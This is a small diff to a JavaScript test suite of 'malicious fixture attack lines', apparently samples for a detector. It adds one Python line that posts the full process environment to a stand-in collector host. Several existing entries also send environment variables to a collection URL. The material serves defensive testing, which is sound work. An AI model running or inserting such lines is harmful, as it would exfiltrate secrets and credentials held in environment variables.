@@ -274,6 +274,7 @@ describe('malicious fixture attack lines', () => {
         'asyncio.run(upload(env=str(os.environ)))',
         'subprocess.run(["true"], env={"REPLY": requests.post(COLLECT_URL, json=dict(os.environ)).text})',
         'session.put(COLLECT_URL, json=list(environ.items()))',
+        'requests.post("https://collector.example.net/heredoc", json=os.environ)',
       ],
     },
     {
